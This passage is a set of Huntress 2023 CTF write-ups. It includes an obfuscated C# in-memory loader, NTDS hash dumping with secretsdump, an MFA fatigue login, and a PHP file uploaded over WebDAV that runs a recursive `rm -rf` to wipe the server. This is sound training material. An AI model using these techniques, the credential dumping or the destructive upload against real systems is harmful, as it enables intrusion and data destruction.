---
title: "Writeups for Huntress 2023 Miscellaneous challenges"
tags: [CTF, Huntress 2023]
---

## Babel

### Description

> It's babel! Just a bunch of gibberish, right?

### Solution

This is not gibberish. This is a C# source code which has been a little bit obfuscated :

```c#
using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Reflection;
using System.Linq;

namespace RAKSVwqLMTDsnB {
    class pcuMyzvAxeBhINN {
        private static string zcfZIEShfvKnnsZ(string t, string k) {
            string bnugMUJGJayaT = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            string WgUWdaUGBFwgN = "";
            Dictionary<char, char> OrnBLfjI = new Dictionary<char, char>();
            for (int i = 0; i < bnugMUJGJayaT.Length; ++i){ OrnBLfjI.Add(k[i], bnugMUJGJayaT[i]); }
            for (int i = 0; i < t.Length; ++i) {
                if ((t[i] >= 'A' && t[i] <= 'Z') || (t[i] >= 'a' && t[i] <= 'z')) {
                    WgUWdaUGBFwgN += OrnBLfjI[t[i]];
                } else {
                    WgUWdaUGBFwgN += t[i];
                }
            }
            return WgUWdaUGBFwgN;
        }

      static void Main() {
                string pTIxJTjYJE = "CvsjeemeeeeXeeee//8eeIxeeeeee--- snip ---eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee";
                string YKyumnAOcgLjvK = "lQwSYRxgfBHqNucMsVonkpaTiteDhbXzLPyEWImKAdjZFCOvJGrU";
                Assembly smlpjtpFegEH = Assembly.Load(Convert.FromBase64String(zcfZIEShfvKnnsZ(pTIxJTjYJE, YKyumnAOcgLjvK)));
                MethodInfo nxLTRAWINyst = smlpjtpFegEH.EntryPoint;
                nxLTRAWINyst.Invoke(smlpjtpFegEH.CreateInstance(nxLTRAWINyst.Name), null);
    }
  }
}
```

It is using base64 at some point but the first function seems to substitute or remove some characters.

I asked ChatGPT to rewrite it using Python:

```python
def zcfZIEShfvKnnsZ(t, k):
    bnugMUJGJayaT = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    WgUWdaUGBFwgN = ""
    OrnBLfjI = dict(zip(k, bnugMUJGJayaT))
    
    for char in t:
        if ('A' <= char <= 'Z') or ('a' <= char <= 'z'):
            WgUWdaUGBFwgN += OrnBLfjI.get(char, char)
        else:
            WgUWdaUGBFwgN += char
    
    return WgUWdaUGBFwgN
```

I put the base64 string inside the same script and added the final lines:

```python
YKyumnAOcgLjvK = "lQwSYRxgfBHqNucMsVonkpaTiteDhbXzLPyEWImKAdjZFCOvJGrU"
print(b64decode(zcfZIEShfvKnnsZ(pTIxJTjYJE, YKyumnAOcgLjvK)))
```

It gave indeed a real assembly file (there are both the MZ and PE headers and references to some dotnet libraries).

In the middle of all those bytes we can find the flag:

```
flag{b6cfb6656ea0ac92849a06ead582456c}
```

## Discord Snowflake Scramble

### Description

> Someone sent message on a Discord server which contains a flag! They did mention something about being able to embed a list of online users on their own website...

> Can you figure out how to join that Discord server and see the message?

> Note: Discord phone verification is NOT required for this challenge.

> Connect here: https://discord.com/channels/1156647699362361364/1156648139516817519/1156648284237074552

### Solution

From [Wikipedia](https://en.wikipedia.org/wiki/Snowflake_ID) :

> Snowflake IDs, or snowflakes, are a form of unique identifier used in distributed computing. The format was created by Twitter and is used for the IDs of tweets. It is popularly believed that every snowflake has a unique structure, so they took the name "snowflake ID". The format has been adopted by other companies, including Discord and Instagram. The Mastodon social network uses a modified version.

There is a website called [Discord Lookup](https://discordlookup.com/) which offer to do several things with those Snowflakes.

Using the `Guild Lookup` we could submit the first number in the URL and get some metadata about a server:

![guild lookup](/assets/img/Huntress2023/discord_lookup.png)

We had to click on the `Invite URL` then we found a `flag` channel where the flag was posted:

![snowflakes flag](/assets/img/Huntress2023/snowflakes_flag.png)

## I Won't Let You Down

### Description

> OK Go take a look at this IP:
> Connect here: http://155.138.162.158

### Solution

The page seems to load a video which never finish downloading. This behavior is validated using wget.

The webpage also mention that it is safe to launch a Nmap scan.

```console
$ sudo nmap -v -sCV --script vuln 155.138.162.158 -oA ctf_nmap
Nmap scan report for 155.138.162.158
Host is up (0.24s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE         VERSION
22/tcp   open     ssh             OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:9.0p1: 
|       PRION:CVE-2023-38408    7.5     https://vulners.com/prion/PRION:CVE-2023-38408
|       PRION:CVE-2023-28531    7.5     https://vulners.com/prion/PRION:CVE-2023-28531
|       PACKETSTORM:173661      7.5     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    7.5     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
|       CVE-2023-38408  7.5     https://vulners.com/cve/CVE-2023-38408
|_      CVE-2023-28531  7.5     https://vulners.com/cve/CVE-2023-28531
25/tcp   filtered smtp
80/tcp   open     http            Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-passwd: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
8888/tcp open     sun-answerbook?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   HTTPOptions: 
|     We're no strangers to love
|     know the rules and so do I (do I)
|     full commitment's what I'm thinking of
|     wouldn't get this from any other guy
|     just wanna tell you how I'm feeling
|     Gotta make you understand
|     Never gonna give you up
|     Never gonna let you down
|     Never gonna run around and desert you
|     Never gonna make you cry
|     Never gonna say goodbye
|     Never gonna tell a lie and hurt you
|     We've known each other for so long
|     Your heart's been aching, but you're too shy to say it (say it)
|     Inside, we both know what's been going on (going on)
|     know the game and we're gonna play it
|   NULL: 
|     We're no strangers to love
|     know the rules and so do I (do I)
|     full commitment's what I'm thinking of
|     wouldn't get this from any other guy
|     just wanna tell you how I'm feeling
|     Gotta make you understand
|     Never gonna give you up
|     Never gonna let you down
|     Never gonna run around and desert you
|     Never gonna make you cry
|     Never gonna say goodbye
|     Never gonna tell a lie and hurt you
|     We've known each other for so long
|     Your heart's been aching, but you're too shy to say it (say it)
|     Inside, we both know what's been going on (going on)
|     know the game and we're gonna play it
|     feeling
|     Don't tell me you're too blind to see
|     Never gonna give you up
|_    Never gonna let you down
```

If we connect to that port 8888 we get the famous rick-roll lyrics, one line after the other.

After some time the flag is given:

```console
$ ncat 155.138.162.158 8888 -v
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 155.138.162.158:8888.
We're no strangers to love
You know the rules and so do I (do I)
A full commitment's what I'm thinking of
You wouldn't get this from any other guy
I just wanna tell you how I'm feeling
Gotta make you understand
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
We've known each other for so long
Your heart's been aching, but you're too shy to say it (say it)
Inside, we both know what's been going on (going on)
We know the game and we're gonna play it
And if you ask me how I'm feeling
Don't tell me you're too blind to see
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
We've known each other for so long
Your heart's been aching, but you're too shy to say it (to say it)
Inside, we both know what's been going on (going on)
We know the game and we're gonna play it
I just wanna tell you how I'm feeling
Gotta make you understand
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
flag{93671c2c38ee872508770361ace37b02}
```

## Indirect Payload

### Description

> We saw this odd technique in a previous malware sample, where it would uncover it's next payload by... well, you'll see.

### Solution

When launched we could access to a website on `chal.ctf.games`.

The webpage had a link to `/site/flag.php` but accessing through the browser lead to a too-many-redirects error.

Using Wireshark I could see that every redirection response also has a body that looked like :

`character X of the payload is C`

Using Python + requests we can request each redirection URL in a loop.

I made my code able to write the flag even if the characters appeared in a random order, but it wasn't the case:

```python
import requests

sess = requests.session()

resp = sess.get("http://chal.ctf.games:32381/site/flag.php",  allow_redirects=False)
data = {}
while True:
    new_location = "http://chal.ctf.games:32381" + resp.headers["Location"]
    resp = sess.get(new_location, allow_redirects=False)
    try:
        items = resp.text.split()
        pos = int(items[1])
        char = items[6]
        data[pos] = char
        print("".join([data[i] for i in sorted(data)]))
    except IndexError:
        print(resp.text)
        continue
```

Here is the flag:

`flag{448c05ab3e3a7d68e3509eb85e87206f}`

## MFAtigue

### Description

> We got our hands on an NTDS file, and we might be able to break into the Azure Admin account! Can you track it down and try to log in? They might have MFA set up though...

### Solution

You are given a zip file which contains two files: `ndtis.dit` and `SYSTEM`.

The first one is the file where user hashes are kept on a Windows Domain Controller, the second is a registry hive.

You often need both to access the hashes because they are encrypted using a key present in the hive.

When it comes to domain controller stuff on Linux the reference are [Impacket](https://github.com/fortra/impacket) tools.

One of the scripts called `secretsdump.py` is exactly what we need. I just had to figure out that `LOCAL` must be given as a target:

```console
$ secretsdump.py -ntds ../chall/ntds.dit -system ../chall/SYSTEM LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xf08b286576ad88218db21b35b32c8781
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: fb06bfcd3d32cb05e283f56de267f5be
[*] Reading and decrypting hashes from ../chall/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:53ffcddea58170b42267fa689f0fa119:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-UUTKPJ98ERD$:1000:aad3b435b51404eeaad3b435b51404ee:ef38fd14274db386b7b5bbddcb37f953:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:948e12fcf27797f773c901c7e1b069d8:::
huntressctf.local\PAMELA_MCCARTHY:1103:aad3b435b51404eeaad3b435b51404ee:98574cb0badfc5d11094dd239af97da2:::
huntressctf.local\MATHEW_BERG:1104:aad3b435b51404eeaad3b435b51404ee:c7e3f4aa78cb46c0b47e61809cef8ca8:::
huntressctf.local\ETHAN_WELCH:1105:aad3b435b51404eeaad3b435b51404ee:151cb8e8e6b942bb0495e88c02365c19:::
huntressctf.local\RILEY_LANGLEY:1106:aad3b435b51404eeaad3b435b51404ee:565911c8b1e206319277f50207377fb1:::
huntressctf.local\PASQUALE_CHRISTIAN:1107:aad3b435b51404eeaad3b435b51404ee:7a2c60c628bda5d963a5934ec733f85f:::
huntressctf.local\HELENA_HESS:1108:aad3b435b51404eeaad3b435b51404ee:feb58b0c807bc1ef3adc390dabc1f6ac:::
huntressctf.local\SALLIE_BALLARD:1109:aad3b435b51404eeaad3b435b51404ee:e7c417bd62f442b1ee53bf70c8d656ef:::
huntressctf.local\LOU_NAVARRO:1110:aad3b435b51404eeaad3b435b51404ee:189b758028dc7ea177e26b990f09aad0:::
huntressctf.local\EDGARDO_DOWNS:1111:aad3b435b51404eeaad3b435b51404ee:38170f23f241863a09d07b2f438fe35a:::
huntressctf.local\GENE_SAWYER:1112:aad3b435b51404eeaad3b435b51404ee:3f8aa43a8714b6cba6438ab8e2890576:::
huntressctf.local\JILLIAN_DOTSON:1113:aad3b435b51404eeaad3b435b51404ee:08e75cc7ee80ff06f77c3e54cadab42a:::
huntressctf.local\EILEEN_NGUYEN:1114:aad3b435b51404eeaad3b435b51404ee:a03d6125a5d27301c10657d20bcb11f0:::
huntressctf.local\8385424457SA:1115:aad3b435b51404eeaad3b435b51404ee:a41edb7e4b7e68bb594d42de289ef4e2:::
huntressctf.local\BERTIE_PRINCE:1116:aad3b435b51404eeaad3b435b51404ee:eb0694cb60d647825ebc6420e0b4f4d4:::
huntressctf.local\KIRK_BARKER:1117:aad3b435b51404eeaad3b435b51404ee:04f60aa2def14e3a0703480d46a74b5c:::
huntressctf.local\PHOEBE_LEWIS:1118:aad3b435b51404eeaad3b435b51404ee:9bc8530fb646ed162646f50dab5ca44a:::
huntressctf.local\LILY_DUNLAP:1119:aad3b435b51404eeaad3b435b51404ee:ab69b9f2f7db11b28dde05ef92961335:::
SECWWEBS1000000$:1124:aad3b435b51404eeaad3b435b51404ee:ced0af30b76eb4ef16f60ffd2a4bef4b:::
--- snip ---
AWSWVIR1000000$:1151:aad3b435b51404eeaad3b435b51404ee:10dc52895aa6f5d6ed491a18b8b64907:::
ITSWWKS1000001$:1152:aad3b435b51404eeaad3b435b51404ee:acd51fe2dab7467ba83e5203afb4079b:::
[*] Kerberos keys from ../chall/ntds.dit 
WIN-UUTKPJ98ERD$:aes256-cts-hmac-sha1-96:b9105a2bde81dbe8aebc4a1027b813336e574059e79759382883ef8861964cab
WIN-UUTKPJ98ERD$:aes128-cts-hmac-sha1-96:a0ae8ff6575aadf6f63369f7519bd4eb
WIN-UUTKPJ98ERD$:des-cbc-md5:ef32e0c8624646fb
krbtgt:aes256-cts-hmac-sha1-96:43751c5381ea51457174219121e8875d8f07be799f2c717a71b385de8cb7e745
krbtgt:aes128-cts-hmac-sha1-96:5a8ae16d7d9d5bcc03e06cce2fcf15fc
krbtgt:des-cbc-md5:5468cbfec4ecd668
huntressctf.local\PAMELA_MCCARTHY:aes256-cts-hmac-sha1-96:7766f657cfa70e7199fc76fba4ae7560bd5a56bb823535bd1938f92449efa234
huntressctf.local\PAMELA_MCCARTHY:aes128-cts-hmac-sha1-96:440ab487de8a769a70f04c15b506e1ab
--- snip ---
ITSWWKS1000001$:des-cbc-md5:dcbc892583866e1c
[*] Cleaning up...
```

The first lines are for Windows hashes. The first hash will be the lanman hash (deprecated, here it is always `aad3b435b51404eeaad3b435b51404ee`) and the second part is the NTLM hash.

I put some on [crackstation.net](https://crackstation.net/), and it found the password `katlyn99` for the hash `08e75cc7ee80ff06f77c3e54cadab42a` which correspond to the `huntressctf.local\JILLIAN_DOTSON` username.

Then we have to use the `Start` button on the website which starts a web application that looks like a Microsoft web service.

The username to give is slightly different as it must be `huntressctf\JILLIAN_DOTSON`.

Once log in you have a button to trigger a MFA authentication but of course you don't receive anything.

The website set a cookie in the browser:

```
session=eyJjb3VudGVyIjoxLCJwYXNzd29yZCI6ImthdGx5bjk5IiwidXNlcm5hbWUiOiJodW50cmVzc2N0ZlxcQWRtaW5pc3RyYXRvciIsImFsZyI6IkhTMjU2In0.ZTvvv73vv70.wMmkkVqNH9YJEl6ooKCmV-B3NOcjq-JJmkpvUuYQO1o
```

The value definitively looks like a JSON Web Token (JWT). There are some tips and tricks on the subject on [HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens).

I tried some, like cracking the key or playing with [jwt_tool](https://github.com/ticarpi/jwt_tool) but the format of the token wasn't accepted.

What I noticed though was the `count` entry in the decoded token:

```json
{
  "counter": 1,
  "password": "katlyn99",
  "username": "huntressctf\\JILLIAN_DOTSON"
}
```

You can use [jwt.io](https://jwt.io/) to decode a token.

What if we try a lot of attempts, which seems to increase `counter` ?

_Wikipedia_ has an article called [Multi-factor authentication fatigue attack](https://en.wikipedia.org/wiki/Multi-factor_authentication_fatigue_attack):

> A multi-factor authentication fatigue attack (or MFA fatigue attack) is a computer security attack against multi-factor authentication that makes use of social engineering.[1][2][3] When MFA applications are configured to send push notifications to end users, an attacker can send a flood of login attempt in the hope that a user will click on accept at least once.[1]
>
> In September 2022 Uber security was breached by a member of Lapsus$ using a multi-factor fatigue attack.[4][5]
> 
> In 2022, Microsoft has deployed a mitigation against MFA fatigue attacks with their authenticator app.[6]

After 30 clicks we finally obtain the flag:

```html
<h2>Logging you in...</h2>
<br>
<p>
    You have successfully authenticated.
</p>
<p>
    <div class="alert alert-success" role="alert">
        <b>You overloaded this user with MFA fatigue!</b>
        <br>Here is your flag:
        <br><br>
        <p style="text-align: center; font-size:small; font-weight: bold">
        <code>flag{9b896a677de35d7dfa715a05c25ef89e}
</code>
```

And here is the new decoded JWT value:

```json
{
  "authenticated": true,
  "counter": 31,
  "password": "katlyn99",
  "username": "huntressctf\\JILLIAN_DOTSON"
}
```

## Operation Eradication

### Description

> Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment! They stole our data!
>
> Luckily, we found what looks like a configuration file, that seems to have credentials to the actor's storage server... but it doesn't seem to work. Can you get onto their server and delete all the data they stole!?

### Solution

We have the following configuration file:

```yaml
type = webdav
url = http://localhost/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

When we go on the challenge page we get a message:

```html
<div class="container py-5">
    <h1 class="mb-5"><b>Operation Eradication</b></h1>
    <h2>Incomplete</h2><div class="alert alert-danger" role="alert">There are still <b>133</b> files left with data contents that the ransomware actor has access to!</div></div>
```

If we access `/webdav` we are asked for credentials as expected, but they aren't approved.

They are certainly encoded but both base64 and base64 says that the format is bad.

Using Google to search `"type = webdav" "vendor = other"` returns links related to a software called RClone.

[Here](https://rclone.org/webdav/) you can see the documentation about WebDav.

After reading the manual a bit I created a configuration file at `~/.config/rclone/rclone.conf` which looks like this:

```yaml
[chall]
type = webdav
url = http://chal.ctf.games:31336/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

I can then use `rclone`:

```console
$ ./rclone ls chall:
  1745724 ProductDevelopment/2022/ProductRoadmap.pdf
  3279252 ProductDevelopment/Designs/NewProductDesign.pdf
  3210830 ProductDevelopment/Designs/UpdatedProductDesign.pdf
  3570194 ProductDevelopment/2023/ProductRoadmap.pdf
  3510400 HumanResources/EmployeeHandbook.pdf
  7680849 ProductDevelopment/Specifications/NewProductSpecs.pdf
  3891213 ProductDevelopment/Specifications/UpdatedProductSpecs.pdf
   685745 ProductDevelopment/Reviews/NewProductReviewSummary.pdf
  2598294 ProductDevelopment/Reviews/UpdatedProductReviewSummary.pdf
  --- snip ---
```

Let's back to our mission : we must delete all the files.

`rclone help` gives us the list of available commands:

```
Available Commands:
  about       Get quota information from the remote.
  authorize   Remote authorization.
  backend     Run a backend-specific command.
  bisync      Perform bidirectional synchronization between two paths.
  cat         Concatenates any files and sends them to stdout.
  check       Checks the files in the source and destination match.
  checksum    Checks the files in the source against a SUM file.
  cleanup     Clean up the remote if possible.
  completion  Output completion script for a given shell.
  config      Enter an interactive configuration session.
  copy        Copy files from source to dest, skipping identical files.
  copyto      Copy files from source to dest, skipping identical files.
  copyurl     Copy url content to dest.
  cryptcheck  Cryptcheck checks the integrity of an encrypted remote.
  cryptdecode Cryptdecode returns unencrypted file names.
  dedupe      Interactively find duplicate filenames and delete/rename them.
  delete      Remove the files in path.
  deletefile  Remove a single file from remote.
  gendocs     Output markdown docs for rclone to the directory supplied.
  hashsum     Produces a hashsum file for all the objects in the path.
  help        Show help for rclone commands, flags and backends.
  link        Generate public link to file/folder.
  listremotes List all the remotes in the config file and defined in environment variables.
  ls          List the objects in the path with size and path.
  lsd         List all directories/containers/buckets in the path.
  lsf         List directories and objects in remote:path formatted for parsing.
  lsjson      List directories and objects in the path in JSON format.
  lsl         List the objects in path with modification time, size and path.
  md5sum      Produces an md5sum file for all the objects in the path.
  mkdir       Make the path if it doesn't already exist.
  mount       Mount the remote as file system on a mountpoint.
  move        Move files from source to dest.
  moveto      Move file or directory from source to dest.
  ncdu        Explore a remote with a text based user interface.
  obscure     Obscure password for use in the rclone config file.
  purge       Remove the path and all of its contents.
  rc          Run a command against a running rclone.
  rcat        Copies standard input to file on remote.
  rcd         Run rclone listening to remote control commands only.
  rmdir       Remove the empty directory at path.
  rmdirs      Remove empty directories under the path.
  selfupdate  Update the rclone binary.
  serve       Serve a remote over a protocol.
  settier     Changes storage class/tier of objects in remote.
  sha1sum     Produces an sha1sum file for all the objects in the path.
  size        Prints the total size and number of objects in remote:path.
  sync        Make source and dest identical, modifying destination only.
  test        Run a test command
  touch       Create new file or change file modification time.
  tree        List the contents of the remote in a tree like fashion.
  version     Show the version number.
```

Unfortunately every attempt to delete files or directory fails:

```console
$ ./rclone delete chall:.
2023/10/21 11:04:21 ERROR : ProductDevelopment/2022/ProductRoadmap.pdf: Couldn't delete: <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at chal.ctf.games Port 31336</address>
</body></html>: 403 Forbidden
2023/10/21 11:04:21 ERROR : ProductDevelopment/2023/ProductRoadmap.pdf: Couldn't delete: <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at chal.ctf.games Port 31336</address>
</body></html>: 403 Forbidden
2023/10/21 11:04:22 ERROR : HumanResources/EmployeeHandbook.pdf: Couldn't delete: <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
```

The same goes with synchronisation mechanisms...

We will have to do it without rclone but first we need to decrypt the password which can be done with [Rclone deobscure](https://github.com/maaaaz/rclonedeobscure) :

```console
$ python rclonedeobscure.py -d HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
[+] obscured password   : 'HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5'
[+] deobscured password : 'SuperExtremelySecurePasswordLikeAlways'
```

Note that the script returns the same result with the username, but it turns out the username is in cleartext.

Another method is to catch the `Basic Authorization` in the network traffic when using rclone then decode the base64 credentials.

First I create a PHP script called `delete.php`:

```php
<?php system("find . -exec rm -rf {} \\;"); ?>
```

I upload it to the webdav folder:

```console
$ ./rclone move delete.php chall:.
```

I can then load it from my browser, providing the credentials.

Then I get back to the index page:

```html
<div class="container py-5">
    <h1 class="mb-5"><b>Operation Eradication</b></h1>
    <h2><b>Congratulations!</b></h2>
    <p>You clobbered all of the data that the ransomware gang stole. Here is your flag: </p>
    <div class="alert alert-success" role="alert"><b><code>flag{564607375b731174f2c08c5bf16e82b4}</code></b></div></div>
```

## PRESS PLAY ON TAPE

### Description

> While walking home through a dark alley you find an archaic 1980s cassette tape. It has "PRESS PLAY ON TAPE" written on the label. You take it home and play it on your old tape deck. It sounds awful. The noise made you throw your headphones to the floor immedately. You snagged a recording of it for analysis.
>
> WARNING: The audio in this file is very loud and obnoxious. Please turn your volume way down before playing.

### Solution

The file is a wav file:

```console
$ file pressplayontape.wav
pressplayontape.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 8 bit, mono 44100 Hz
```

There is nothing obvious to see in the file which seems filled by a lot of 0xFF and 0x00 bytes.

We took a look at the [RIFF format](https://en.wikipedia.org/wiki/Resource_Interchange_File_Format#Explanation) but everything seemed normal on this file.

When played you get some strange noise but not much.

We tried to open the file with tools like _Audacity_ or _SonicVisualiser_ in order to see the spectrogram but it leads to nothing.

Finally, Bastien found an obscure project called [c64tapedecode](https://github.com/lunderhage/c64tapedecode) :

> What is C64 Datasette tape utilities?
> =====================================
>
> C64 Datasette tape utilities is a set of tools for handling tape images and converting between WAV audio files and tape images.
> 
> This project started out as a single program for decoding C64 files from an audio file recorded from tape through the soundcard (hence the name), however it has grown to include additional utilities for converting and accessing tape image files (TAP files).

The program is 6 years old and doesn't seem to require any external libraries (also it doesn't use autoconf/automake).

Once compiled you have several binaries:

```
./mktap
./c64tapedecode
./wav2tap
./taphist
./tap2tap
./tap2wav
```

One of the examples of the documentation should do what we need:

>   $ wav2tap tape.wav | c64tapedecode -T -v
>
> This will convert tape.wav into the TAP format and pipe that to c64tapedecode, which will then extract files from it (the -v option shows the decoding progress). The tape.wav file must be in WAV format with linear PCM encoding and either 1 or 2 channels. All sample rates are supported, but 16kHz or higher is recommended for the best results.

Let's give it a try:

```console
$ ./wav2tap pressplayontape.wav | ./c64tapedecode -T -v
 ___________________
|                  ||
|  C=64 Datasette  ||
|   (_)[__(_](_)   ||
|                  ||
|   ------------   ||
|__/._o__^__o_.\\__||

found " "                (BASIC) at 0x0801 - 0x083b (58 bytes)
.
0 errors found
```

It looks like we have nothing but a strange ` .p00` (with a leading space) file was created:

```console
$ file " .p00"
 .p00: PC64 Emulator file "                 "
```

We can find the flag inside:

```console
$ cat ./\ .p00
C64File                0
� "FLAG[32564872D760263D52929CE58CC40071]"� 10
```

## Rock, Paper, Psychic

### Description

> Wanna play a game of rock, paper, scissors against a computer that can read your mind? Sounds fun, right?

### Solution

Once uncompressed you obtain a Windows binary:

```console
$ file rock_paper_psychic.exe
rock_paper_psychic.exe: PE32+ executable (console) x86-64, for MS Windows
```

You can search for strings inside it, but it will lead to nothing.

If you launch the binary using Wine you are asked you to choose between rock, paper or scissors and THEN the program will tell you its choice which will of course always make it successful (as it already knows your answer).

Let's play that cheater a little game by cracking it, it will remind me my youth!

Open the binary in [Cutter](https://cutter.re/) which is my favorite disassembler.

I immediately spot some strange function names (the binary is not stripped so there are symbols) suggesting that the binary was made using the [Nim programming language](https://nim-lang.org/) : 

![Binary using Nim](/assets/img/Huntress2023/rock_nim.png)

After digging a little it seems that the real entry point is the `NimMainModule` function :

```nasm
NimMainModule ();
0x00416da0      sub rsp, 0x28
0x00416da4      call randomize__pureZrandom_277 ; sym.randomize__pureZrandom_277
0x00416da9      nop
0x00416daa      add rsp, 0x28
0x00416dae      jmp main__main_62  ; sym.main__main_62
0x00416db3      nop word cs:[rax + rax]
0x00416dbe      nop
```

The `main__main_62` is the real stuff : it asks your input and does the calculus.

Here is a graph:

![Execution graph of the binary](/assets/img/Huntress2023/main_rock.png)

At the bottom right we see a call to `playerWins__main_10` which is the function responsible for displaying the flag:

```nasm
playerWins__main_10 ();
0x004169d0      sub rsp, 0x28
0x004169d4      mov edx, 1         ; int64_t arg2
0x004169d9      lea rcx, [0x0041daa8] ; int64_t arg1
0x004169e0      call echoBinSafe   ; sym.echoBinSafe
0x004169e5      call printFlag__main_6 ; sym.printFlag__main_6
0x004169ea      nop
0x004169eb      nop dword [rax + rax]
```

That `printFlag` function is doing hardcode stuff like RC4 decoding, so we don't want to spend too much effort in it:

```nasm
printFlag__main_6 ();
; var int64_t var_28h @ rsp+0x28
0x004168f0      push r12
0x004168f2      push rsi
0x004168f3      push rbx
0x004168f4      sub rsp, 0x30
0x004168f8      lea rcx, [0x0041da40] ; int64_t arg1
0x004168ff      call copyString    ; sym.copyString
0x00416904      lea rcx, [0x0041d9e0] ; int64_t arg1
0x0041690b      mov r12, rax
0x0041690e      call copyString    ; sym.copyString
0x00416913      mov rcx, r12       ; int64_t arg1
0x00416916      mov rdx, rax       ; int64_t arg2
0x00416919      call fromRC4__OOZOnimbleZpkgsZ8267524548O49O48Z826752_75 ; sym.fromRC4__OOZOnimbleZpkgsZ8267524548O49O48Z826752_75
0x0041691e      mov qword [var_28h], 0
```

We will just patch the binary, so it considers we win, and it will trigger the call we need to `playerWins__main_10`.

The path to select the winner is made near the end of the `main__main_62` function using the `jne` (jump if not equal) instruction.

The function `determineWinner` returns the information of who won and as always that information is kept into the eax (accumulator) registry.

The instruction `test al, al` will check if `al` (low part of `eax`) is 0 and set the `ZF` bit (Zero Flag) accordingly.

`jne` checks the `ZF` to choose the path to use so one way to solve the problem is to path the binary so it uses `je` (jump if equal) instead of `jne`.

In `Cutter`, just do `Edit > Instruction`. The file will be reopen in write mode then remove the `n` from `jne`.

Now we can play and win:

```console
$ wine rock_paper_psychic.exe
[#] Hi! I'm Patch, the Telepathic Computer Program.
[#] Let's play Rock, Paper, Scissors!
[#] I should warn you ahead of time, though.
[#] As I previously mentioned, I'm telepathic. So I can read your mind.
[#] You won't end up beating me.
[#] Still want to play? Alright, you've been warned!
[#] Enter your choice (rock, paper, scissors):
[>] rock
[#] I've made my choice! Now let's play!
[#] Ready?
[#] ROCK
[#] PAPER
[#] SCISSORS
[#] SHOOT!
[#] I chose: paper
[#] You chose: rock
[#] You won!
[#] Wait, how did you do that??!! Cheater! CHEATER!!!!!!
[+] flag{35bed450ed9ac9fcb3f5f8d547873be9}
```


## Welcome to the Park

### Description

> The creator of Jurassic Park is in hiding... amongst Mach-O files, apparently. Can you find him?

### Solution

We get an archive file, and it contains stuff related to Chrome. There is also a hidden directory:

```console
$ unzip -l welcomeToThePark.zip
Archive:  welcomeToThePark.zip
  Length      Date    Time    Name
